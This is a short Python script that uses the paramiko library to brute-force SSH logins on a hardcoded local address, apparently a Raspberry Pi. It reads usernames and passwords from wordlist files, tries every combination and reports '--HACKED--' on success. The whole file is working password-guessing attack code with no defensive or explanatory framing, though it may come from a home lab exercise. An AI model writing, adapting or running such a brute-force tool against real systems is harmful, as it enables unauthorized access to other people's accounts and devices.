import paramiko
import time
import sys

#get user names and passwords from files
userNames = open("commonUsers","r")
passwords = open("words.txt","r")

userList = userNames.readlines()
passList = passwords.readlines()

userNames.close()
passwords.close()

userList = [x.strip() for x in userList]
passList = [x.strip() for x in passList]

#target pi address
host = "192.168.1.19"

hacked = False

start_time = time.time()

for user in userList:
	for password in passList:
		if hacked == True:
			break;
		print("User is ", user, " Pass: ", password)
		try:
			t = paramiko.Transport((host,22))
			t.connect(username=user,password=password)
			print("--HACKED--")
			t.close()
			hacked = True
			sys.exit("DONE")
		except:
			if hacked == True:
				sys.exit("Pi hacked")
			print("LOG IN FAILED")

print("--- %s seconds ---" % (time.time() - start_time))

